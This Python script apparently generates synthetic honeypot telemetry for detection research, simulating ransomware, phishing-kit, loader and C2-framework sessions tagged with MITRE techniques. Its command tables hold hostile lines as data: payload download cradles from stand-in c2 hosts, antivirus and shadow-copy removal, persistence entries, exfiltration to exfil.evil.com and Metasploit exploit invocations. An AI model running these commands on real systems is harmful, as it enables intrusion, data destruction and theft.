"""CaaS (Cybercrime as a Service) simulator dataset generator."""

from __future__ import annotations
import argparse
import json
import random
import time
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Literal
import numpy as np
import pyarrow as pa
import pyarrow.parquet as pq

from aag_be.features import SessionFingerprint, CommandEvent, NetworkEvent, FileEvent, LLMInteraction


# ─── CaaS Profiles ───

@dataclass
class CaaSProfile:
    name: str
    caas_type: str
    description: str
    operators: list[str]
    typical_targets: list[str]
    pricing_model: str
    infrastructure: dict
    mitre_techniques: list[str]
    lolbins: list[str]
    llm_usage: str  # "none", "low", "medium", "high"
    opacity: str  # "low", "medium", "high"


CAAS_PROFILES = {
    "LockBit": CaaSProfile(
        name="LockBit",
        caas_type="RAAS",
        description="Ransomware-as-a-Service affiliate program with automated encryption",
        operators=["LockBitSupp", "Affiliates"],
        typical_targets=["Enterprise", "Healthcare", "Manufacturing", "Government"],
        pricing_model="Revenue share (20% operator, 80% affiliate)",
        infrastructure={
            "c2": ["Tor hidden services", "Fast flux DNS", "Cloudflare"],
            "payment": ["BTC", "XMR", "BUSD"],
            "leak_site": "lockbit[.]onion",
        },
        mitre_techniques=[
            "T1486", "T1490", "T1485", "T1059", "T1021", "T1003", "T1005", "T1041",
            "T1562", "T1070", "T1112", "T1560", "T1567",
        ],
        lolbins=[
            "powershell", "wmic", "vssadmin", "bcdedit", "wbadmin", "cipher",
            "certutil", "reg", "schtasks", "net", "wget", "curl",
        ],
        llm_usage="medium",
        opacity="high",
    ),
    "BlackCat": CaaSProfile(
        name="BlackCat",
        caas_type="RAAS",
        description="ALPHV/BlackCat Rust-based ransomware with sophisticated evasion",
        operators=["ALPHV", "Affiliates"],
        typical_targets=["Critical Infrastructure", "Financial", "Legal", "Tech"],
        pricing_model="Revenue share + subscription tiers",
        infrastructure={
            "c2": ["Custom C2 framework", "Domain fronting", "Cloud hosting"],
            "payment": ["BTC", "XMR"],
            "leak_site": "alphv[.]onion",
        },
        mitre_techniques=[
            "T1486", "T1490", "T1059", "T1021", "T1003", "T1005", "T1041",
            "T1562", "T1027", "T1055", "T1036", "T1574",
        ],
        lolbins=[
            "powershell", "cmd", "wmic", "rundll32", "regsvr32", "mshta",
            "certutil", "bitsadmin", "schtasks", "sc", "net",
        ],
        llm_usage="high",
        opacity="high",
    ),
    "EvilProxy": CaaSProfile(
        name="EvilProxy",
        caas_type="PHISHING_KIT",
        description="Phishing-as-a-Service with reverse proxy MFA bypass",
        operators=["EvilProxy", "Affiliates"],
        typical_targets=["Microsoft 365", "Google Workspace", "Okta", "VPN portals"],
        pricing_model="Subscription ($150-500/month)",
        infrastructure={
            "c2": ["Phishing panels", "Reverse proxies", "Ngrok/Cloudflare tunnels"],
            "payment": ["BTC", "XMR", "USDT"],
            "delivery": ["Email", "SMS", "Teams", "Slack"],
        },
        mitre_techniques=[
            "T1566", "T1566.002", "T1556", "T1556.002", "T1078", "T1550",
            "T1555", "T1539", "T1611",
        ],
        lolbins=[
            "curl", "wget", "python", "php", "nginx", "certbot",
        ],
        llm_usage="high",
        opacity="medium",
    ),
    "Greatness": CaaSProfile(
        name="Greatness",
        caas_type="PHISHING_KIT",
        description="Microsoft 365 phishing kit with AiTM capabilities",
        operators=["Greatness", "Affiliates"],
        typical_targets=["Enterprise Microsoft 365"],
        pricing_model="Subscription ($120/month) + revenue share",
        infrastructure={
            "c2": ["AiTM proxy servers", "Telegram bots", "Web panels"],
            "payment": ["BTC", "XMR", "LTC"],
            "delivery": ["Email", "QR codes"],
        },
        mitre_techniques=[
            "T1566", "T1556", "T1556.002", "T1078", "T1550", "T1539",
        ],
        lolbins=[
            "curl", "python", "node", "nginx", "certbot",
        ],
        llm_usage="medium",
        opacity="medium",
    ),
    "Qakbot": CaaSProfile(
        name="Qakbot",
        caas_type="LOADER",
        description="Modular loader/botnet with ransomware deployment capability",
        operators=["Qakbot group", "Affiliates"],
        typical_targets=["Enterprise", "Financial", "Healthcare"],
        pricing_model="Pay-per-install + revenue share",
        infrastructure={
            "c2": ["Tiered C2", "Domain generation", "Peer-to-peer"],
            "payment": ["BTC", "XMR"],
            "delivery": ["Email", "Exploit kits", "Malvertising"],
        },
        mitre_techniques=[
            "T1566", "T1059", "T1055", "T1027", "T1003", "T1021", "T1041",
            "T1562", "T1070", "T1112", "T1105", "T1082",
        ],
        lolbins=[
            "powershell", "cmd", "wmic", "rundll32", "regsvr32", "mshta",
            "certutil", "bitsadmin", "schtasks", "wscript", "cscript",
        ],
        llm_usage="low",
        opacity="high",
    ),
    "CobaltStrike": CaaSProfile(
        name="CobaltStrike",
        caas_type="C2_FRAMEWORK",
        description="Commercial C2 framework widely abused by threat actors",
        operators=["Various APT", "Ransomware groups", "Initial access brokers"],
        typical_targets=["Global", "All sectors"],
        pricing_model="License ($3,500/year) + cracked versions",
        infrastructure={
            "c2": ["Malleable C2 profiles", "Domain fronting", "CDN", "Redirectors"],
            "payment": ["N/A (commercial)", "Cracked: free"],
            "beacon": ["HTTP", "HTTPS", "DNS", "SMB", "TCP"],
        },
        mitre_techniques=[
            "T1059", "T1055", "T1021", "T1003", "T1082", "T1018", "T1573",
            "T1071", "T1090", "T1001", "T1027", "T1036", "T1053",
        ],
        lolbins=[
            "powershell", "rundll32", "regsvr32", "wmic", "certutil", "bitsadmin",
            "schtasks", "sc", "net", "mshta", "cscript", "wscript",
        ],
        llm_usage="medium",
        opacity="medium",
    ),
    "Metasploit": CaaSProfile(
        name="Metasploit",
        caas_type="EXPLOIT_KIT",
        description="Open-source exploitation framework with AI-assisted modules",
        operators=["Script kiddies", "Red teams", "APT (modified)"],
        typical_targets=["Unpatched systems", "IoT", "Web applications"],
        pricing_model="Free (open source) / Pro ($5,000/year)",
        infrastructure={
            "c2": ["Meterpreter", "HTTP/HTTPS", "DNS", "Custom"],
            "payment": ["N/A"],
            "modules": ["Exploits", "Auxiliary", "Post", "Payloads"],
        },
        mitre_techniques=[
            "T1190", "T1059", "T1068", "T1003", "T1021", "T1055", "T1053",
            "T1027", "T1562", "T1070", "T1082", "T1018",
        ],
        lolbins=[
            "msfconsole", "msfvenom", "ruby", "python", "bash", "powershell",
            "wmic", "certutil", "regsvr32", "rundll32",
        ],
        llm_usage="low",
        opacity="low",
    ),
}


DECOY_PERSONAS = [
    "LEGACY_WIN", "K8S_NODE", "CI_RUNNER", "IOT_GW", "DEV_WS", "CLOUD_FN"
]


def generate_caas_session(
    profile: CaaSProfile,
    session_num: int,
    start_ts: float,
) -> SessionFingerprint:
    """Generate a session simulating CaaS operator/affiliate activity."""
    # Duration varies by CaaS type
    duration_ranges = {
        "RAAS": (60, 480),
        "PHISHING_KIT": (10, 120),
        "LOADER": (30, 240),
        "C2_FRAMEWORK": (120, 1440),
        "EXPLOIT_KIT": (15, 180),
    }
    duration_min = random.uniform(*duration_ranges.get(profile.caas_type, (30, 240)))
    end_ts = start_ts + duration_min * 60

    commands = []
    network = []
    files = []
    llm_interactions = []
    mitre_techniques = []

    current_time = start_ts
    pid_counter = 3000 + session_num * 100

    # Phase weights based on CaaS type
    phase_weights = {
        "RAAS": [
            ("recon", 0.1), ("initial_access", 0.15), ("execution", 0.15),
            ("privilege_escalation", 0.1), ("defense_evasion", 0.1),
            ("discovery", 0.1), ("lateral_movement", 0.1),
            ("collection", 0.05), ("impact", 0.15),
        ],
        "PHISHING_KIT": [
            ("resource_development", 0.2), ("initial_access", 0.4),
            ("credential_access", 0.3), ("defense_evasion", 0.1),
        ],
        "LOADER": [
            ("initial_access", 0.3), ("execution", 0.3),
            ("persistence", 0.1), ("defense_evasion", 0.2),
            ("command_and_control", 0.1),
        ],
        "C2_FRAMEWORK": [
            ("initial_access", 0.1), ("execution", 0.1),
            ("command_and_control", 0.5), ("lateral_movement", 0.2),
            ("collection", 0.05), ("exfiltration", 0.05),
        ],
        "EXPLOIT_KIT": [
            ("recon", 0.2), ("initial_access", 0.4), ("execution", 0.3),
            ("defense_evasion", 0.1),
        ],
    }

    phases = phase_weights.get(profile.caas_type, [("execution", 1.0)])

    for phase_name, phase_weight in phases:
        phase_duration = duration_min * phase_weight * 60
        phase_end = current_time + phase_duration

        n_steps = random.randint(2, max(5, int(phase_weight * 15)))

        for step in range(n_steps):
            if current_time >= phase_end:
                break

            think_time = random.uniform(0.5, 20)
            current_time += think_time

            # LLM usage based on profile
            llm_prob = {"none": 0.0, "low": 0.1, "medium": 0.3, "high": 0.6}.get(profile.llm_usage, 0.1)
            if random.random() < llm_prob:
                model = "gpt-4" if profile.llm_usage == "high" else "gpt-3.5-turbo"
                llm_interactions.append(LLMInteraction(
                    timestamp=current_time,
                    prompt_tokens=random.randint(100, 2000),
                    completion_tokens=random.randint(200, 3000),
                    model=model,
                    prompt_hash=f"caas_{hash(phase_name) % 1000000:06x}",
                    response_hash=f"resp_{random.randint(0, 999999):06x}",
                    latency_ms=random.uniform(500, 8000),
                    tool_calls=random.randint(0, 3),
                ))
                current_time += random.uniform(1, 5)

            # Generate command
            exe, argv, step_mitre = generate_caas_command(phase_name, profile)
            mitre_techniques.extend(step_mitre)

            pid = pid_counter + step
            ppid = pid_counter if step > 0 else 1

            cmd_event = CommandEvent(
                timestamp=current_time,
                exe=exe,
                argv=argv,
                pid=pid,
                ppid=ppid,
                user="SYSTEM" if "WIN" in random.choice(DECOY_PERSONAS) else "root",
                cwd="C:\\Windows\\Temp" if "WIN" in random.choice(DECOY_PERSONAS) else "/tmp",
                exit_code=0 if random.random() > 0.15 else random.choice([1, 2, 5, 127, 139]),
                duration_ms=random.uniform(50, 15000),
            )
            commands.append(cmd_event)

            # Network (higher for C2 frameworks)
            net_prob = 0.6 if profile.caas_type == "C2_FRAMEWORK" else 0.4
            if random.random() < net_prob:
                dst_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                dst_port = random.choice([80, 443, 8080, 8443, 53, 22, 445, 3389, 8000, 9001])
                net_event = NetworkEvent(
                    timestamp=current_time + random.uniform(0, 1),
                    src_ip="192.168.1.100",
                    dst_ip=dst_ip,
                    dst_port=dst_port,
                    protocol="tcp",
                    direction="out",
                    bytes_sent=random.randint(1000, 5000000),
                    bytes_recv=random.randint(1000, 5000000),
                    process_pid=pid,
                )
                network.append(net_event)

            # Files
            if random.random() < 0.25:
                ops = ["read", "write", "create", "exec", "delete"]
                op = random.choice(ops)
                paths = [
                    "C:\\Temp\\payload.exe", "/tmp/implant", "C:\\Windows\\Temp\\output.txt",
                    "/var/www/html/shell.php", "C:\\Users\\Public\\data.enc",
                    "/home/user/.ssh/id_rsa", "/etc/cron.d/persist",
                ]
                file_event = FileEvent(
                    timestamp=current_time + random.uniform(0, 0.5),
                    path=random.choice(paths),
                    operation=op,
                    process_pid=pid,
                    is_honeyfile=False,
                )
                files.append(file_event)

            current_time += random.uniform(0.1, 3.0)

        current_time = phase_end

    # Add honeyfile interactions
    if random.random() < 0.3:
        for _ in range(random.randint(1, 2)):
            file_event = FileEvent(
                timestamp=current_time + random.uniform(0, 5),
                path="/decoy/admin_creds.txt" if random.random() < 0.5 else "C:\\Decoy\\web.config",
                operation="read",
                process_pid=pid_counter,
                is_honeyfile=True,
            )
            files.append(file_event)

    return SessionFingerprint(
        session_id=f"caas-{profile.name.lower()}-{session_num:05d}",
        start_ts=start_ts,
        end_ts=min(current_time, end_ts),
        src_ip="192.168.1.100",
        user_agent=f"{profile.name}/1.0",
        decoy_persona=random.choice(DECOY_PERSONAS),
        commands=commands,
        network=network,
        files=files,
        llm_interactions=llm_interactions,
        mitre_techniques=list(set(mitre_techniques)),
    )


def generate_caas_command(phase: str, profile: CaaSProfile) -> tuple[str, list[str], list[str]]:
    """Generate a command for CaaS profile and phase."""
    lolbins = profile.lolbins

    caas_commands = {
        "RAAS": {
            "recon": [
                ("nmap", ["-sS", "target.network"]),
                ("ldapsearch", ["-x", "-H", "ldap://dc.target"]),
                ("powershell", ["Get-ADDomain"]),
            ],
            "initial_access": [
                ("powershell", ["Invoke-WebRequest", "-Uri", "http://c2/payload.ps1", "-OutFile", "C:\\Temp\\p.ps1"]),
                ("certutil", ["-urlcache", "-split", "-f", "http://c2/payload.exe", "C:\\Temp\\p.exe"]),
                ("bitsadmin", ["/transfer", "job", "http://c2/payload.exe", "C:\\Temp\\p.exe"]),
            ],
            "execution": [
                ("powershell", ["-ExecutionPolicy", "Bypass", "-File", "C:\\Temp\\p.ps1"]),
                ("wmic", ["process", "call", "create", "cmd /c C:\\Temp\\p.exe"]),
                ("schtasks", ["/create", "/tn", "Update", "/tr", "C:\\Temp\\p.exe", "/sc", "onstart"]),
            ],
            "privilege_escalation": [
                ("powershell", ["Get-System"]),
                ("juicypotato.exe", ["-l", "1337", "-p", "cmd.exe", "-t", "*"]),
                ("printspoofer.exe", ["-c", "cmd.exe"]),
            ],
            "defense_evasion": [
                ("powershell", ["Set-MpPreference", "-DisableRealtimeMonitoring", "$true"]),
                ("wevtutil", ["cl", "Security"]),
                ("vssadmin", ["delete", "shadows", "/all", "/quiet"]),
                ("wbadmin", ["delete", "systemstatebackup"]),
            ],
            "discovery": [
                ("net", ["view", "/domain"]),
                ("powershell", ["Get-ADComputer", "-Filter", "*"]),
                ("arp", ["-a"]),
                ("netstat", ["-ano"]),
            ],
            "lateral_movement": [
                ("psexec", ["\\\\target", "cmd"]),
                ("wmiexec", ["admin@target", "cmd"]),
                ("smbexec", ["admin@target"]),
                ("powershell", ["Enter-PSSession", "-ComputerName", "target"]),
            ],
            "collection": [
                ("powershell", ["Get-ChildItem", "C:\\Users", "-Recurse", "-Include", "*pass*"]),
                ("findstr", ["/s", "/i", "password", "C:\\*.txt"]),
                ("tar", ["-czf", "C:\\Temp\\loot.tar.gz", "C:\\Users"]),
            ],
            "impact": [
                ("powershell", ["Invoke-Ransomware", "-Path", "C:\\Users"]),
                ("vssadmin", ["delete", "shadows", "/all"]),
                ("bcdedit", ["/set", "{default}", "recoveryenabled", "No"]),
                ("cipher", ["/w", "C:\\"]),
            ],
        },
        "PHISHING_KIT": {
            "resource_development": [
                ("python", ["generate_phish.py", "--target", "o365", "--template", "login"]),
                ("nginx", ["-c", "/tmp/nginx.conf"]),
                ("certbot", ["certonly", "--standalone", "-d", "phish.evil.com"]),
            ],
            "initial_access": [
                ("python", ["send_email.py", "--list", "targets.csv", "--template", "o365_login"]),
                ("curl", ["-X", "POST", "--data", "@payload.json", "https://api.twilio.com/messages"]),
            ],
            "credential_access": [
                ("python", ["capture_creds.py", "--proxy", "https://login.microsoftonline.com"]),
                ("python", ["steal_cookies.py", "--session", "session_id"]),
            ],
            "defense_evasion": [
                ("python", ["rotate_proxy.py"]),
                ("nginx", ["-s", "reload"]),
            ],
        },
        "LOADER": {
            "initial_access": [
                ("powershell", ["IEX", "(New-Object Net.WebClient).DownloadString('http://c2/loader.ps1')"]),
                ("mshta", ["http://c2/loader.hta"]),
                ("regsvr32", ["/s", "/n", "/u", "/i:http://c2/loader.sct", "scrobj.dll"]),
            ],
            "execution": [
                ("rundll32", ["loader.dll", "EntryPoint"]),
                ("wmic", ["process", "call", "create", "rundll32.exe loader.dll,EntryPoint"]),
            ],
            "persistence": [
                ("schtasks", ["/create", "/tn", "OneDrive", "/tr", "C:\\Temp\\loader.exe", "/sc", "onlogon"]),
                ("reg", ["add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "OneDrive", "/t", "REG_SZ", "/d", "C:\\Temp\\loader.exe"]),
            ],
            "defense_evasion": [
                ("powershell", ["Add-MpPreference", "-ExclusionPath", "C:\\Temp"]),
                ("attrib", ["+h", "+s", "C:\\Temp\\loader.exe"]),
            ],
            "command_and_control": [
                ("powershell", ["while($true){Invoke-WebRequest http://c2/beacon; Start-Sleep 30}"]),
                ("python", ["c2_beacon.py", "--interval", "30", "--jitter", "10"]),
            ],
        },
        "C2_FRAMEWORK": {
            "initial_access": [
                ("powershell", ["IEX", "(New-Object Net.WebClient).DownloadString('http://c2/beacon.ps1')"]),
                ("mshta", ["http://c2/beacon.hta"]),
            ],
            "execution": [
                ("rundll32", ["beacon.dll", "Start"]),
                ("powershell", ["Start-Process", "beacon.exe"]),
            ],
            "command_and_control": [
                ("powershell", ["Beacon", "-CheckIn"]),
                ("beacon.exe", ["-c2", "https://c2.evil.com", "-profile", "malleable.profile"]),
            ],
            "lateral_movement": [
                ("powershell", ["Invoke-Psexec", "-Target", "target", "-Command", "cmd"]),
                ("beacon.exe", ["-spawn", "smb", "target"]),
            ],
            "collection": [
                ("beacon.exe", ["-keylogger", "start"]),
                ("beacon.exe", ["-screenshot"]),
                ("beacon.exe", ["-download", "C:\\Users\\file.txt"]),
            ],
            "exfiltration": [
                ("beacon.exe", ["-upload", "loot.zip", "https://exfil.evil.com"]),
            ],
        },
        "EXPLOIT_KIT": {
            "recon": [
                ("nmap", ["-sV", "--script", "vuln", "target"]),
                ("msfconsole", ["-x", "use auxiliary/scanner/smb/smb_version; set RHOSTS target; run"]),
            ],
            "initial_access": [
                ("msfconsole", ["-x", "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; run"]),
                ("python", ["exploit.py", "--target", "target", "--port", "445"]),
                ("msfconsole", ["-x", "use exploit/multi/http/struts2_namespace_ognl; set RHOSTS target; run"]),
            ],
            "execution": [
                ("msfconsole", ["-x", "set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit"]),
                ("python", ["post_exploit.py", "--session", "1"]),
            ],
            "defense_evasion": [
                ("msfconsole", ["-x", "run post/windows/manage/migrate"]),
                ("powershell", ["Uninstall-Module", "-Name", "Defender"]),
            ],
        },
    }

    phase_cmds = caas_commands.get(profile.caas_type, {}).get(phase, [("echo", ["unknown"])])
    exe, argv = random.choice(phase_cmds)
    mitre = random.choice(profile.mitre_techniques)

    return exe, argv, [mitre]


def sessions_to_table(sessions: list[SessionFingerprint]) -> pa.Table:
    data = {
        "session_id": [], "start_ts": [], "end_ts": [], "src_ip": [],
        "user_agent": [], "decoy_persona": [], "commands_json": [],
        "network_json": [], "files_json": [], "llm_json": [],
        "mitre_techniques": [], "caas_type": [], "caas_name": [],
    }

    for s in sessions:
        data["session_id"].append(s.session_id)
        data["start_ts"].append(s.start_ts)
        data["end_ts"].append(s.end_ts)
        data["src_ip"].append(s.src_ip)
        data["user_agent"].append(s.user_agent)
        data["decoy_persona"].append(s.decoy_persona)
        data["commands_json"].append(json.dumps([asdict(c) for c in s.commands]))
        data["network_json"].append(json.dumps([asdict(n) for n in s.network]))
        data["files_json"].append(json.dumps([asdict(f) for f in s.files]))
        data["llm_json"].append(json.dumps([asdict(l) for l in s.llm_interactions]))
        data["mitre_techniques"].append(",".join(s.mitre_techniques))
        parts = s.session_id.split("-")
        data["caas_name"].append(parts[1] if len(parts) > 1 else "UNKNOWN")
        data["caas_type"].append(CAAS_PROFILES.get(parts[1].capitalize(), CaaSProfile("", "", "", [], [], "", {}, [], [], "", "", "")).caas_type)

    return pa.Table.from_pydict(data)


def main():
    parser = argparse.ArgumentParser(description="Generate CaaS simulator dataset")
    parser.add_argument("-n", "--num-sessions", type=int, default=5000)
    parser.add_argument("-o", "--output", type=Path, required=True)
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args()

    random.seed(args.seed)
    np.random.seed(args.seed)

    args.output.parent.mkdir(parents=True, exist_ok=True)

    sessions = []
    start_time = time.time()

    profile_names = list(CAAS_PROFILES.keys())
    # Weighted by prevalence
    weights = [0.25, 0.2, 0.15, 0.15, 0.1, 0.1, 0.05]

    for i in range(args.num_sessions):
        if i % 1000 == 0:
            print(f"Generated {i}/{args.num_sessions} sessions...")

        profile_name = random.choices(profile_names, weights=weights)[0]
        profile = CAAS_PROFILES[profile_name]

        session = generate_caas_session(profile, i, start_time + i * 50)
        sessions.append(session)

    print(f"Writing {len(sessions)} sessions to {args.output}...")
    table = sessions_to_table(sessions)
    pq.write_table(table, args.output, compression="snappy")
    print("Done!")


if __name__ == "__main__":
    main()